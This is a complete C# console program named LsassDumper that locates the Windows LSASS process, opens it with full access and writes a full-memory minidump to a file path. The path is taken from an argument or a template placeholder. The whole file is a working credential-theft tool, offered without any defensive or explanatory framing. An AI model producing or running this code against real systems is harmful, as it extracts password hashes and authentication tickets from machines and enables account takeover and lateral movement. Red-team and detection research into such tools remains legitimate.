using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace LsassDumper
{
    class Program
    {
        [DllImport("dbghelp.dll", SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint GENERIC_WRITE = 0x40000000;
        const uint CREATE_ALWAYS = 2;
        const int MiniDumpWithFullMemory = 2;

        static void Main(string[] args)
        {
            string outputPath = args.Length > 0 ? args[0] : "{{ dump_path }}";

            try
            {
                // Find LSASS process
                Process[] lsassProcs = Process.GetProcessesByName("lsass");
                if (lsassProcs.Length == 0)
                {
                    Console.WriteLine("[-] LSASS process not found");
                    return;
                }

                int lsassPid = lsassProcs[0].Id;
                Console.WriteLine($"[+] Found LSASS PID: {lsassPid}");

                // Open LSASS process
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, lsassPid);
                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to open LSASS process");
                    Console.WriteLine($"[-] Error: {Marshal.GetLastWin32Error()}");
                    return;
                }
                Console.WriteLine($"[+] Opened LSASS process handle: {hProcess}");

                // Create output file
                IntPtr hFile = CreateFile(outputPath, GENERIC_WRITE, 0, IntPtr.Zero, CREATE_ALWAYS, 0, IntPtr.Zero);
                if (hFile == IntPtr.Zero || hFile == new IntPtr(-1))
                {
                    Console.WriteLine($"[-] Failed to create dump file: {outputPath}");
                    Console.WriteLine($"[-] Error: {Marshal.GetLastWin32Error()}");
                    CloseHandle(hProcess);
                    return;
                }
                Console.WriteLine($"[+] Created dump file: {outputPath}");

                // Dump LSASS memory
                Console.WriteLine("[*] Dumping LSASS memory...");
                bool success = MiniDumpWriteDump(hProcess, (uint)lsassPid, hFile, MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                if (success)
                {
                    Console.WriteLine($"[+] LSASS memory dumped successfully to: {outputPath}");
                    FileInfo fi = new FileInfo(outputPath);
                    Console.WriteLine($"[+] Dump file size: {fi.Length / 1024 / 1024} MB");
                }
                else
                {
                    Console.WriteLine("[-] Failed to dump LSASS memory");
                    Console.WriteLine($"[-] Error: {Marshal.GetLastWin32Error()}");
                }

                // Cleanup
                CloseHandle(hFile);
                CloseHandle(hProcess);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Exception: {ex.Message}");
            }
        }
    }
}
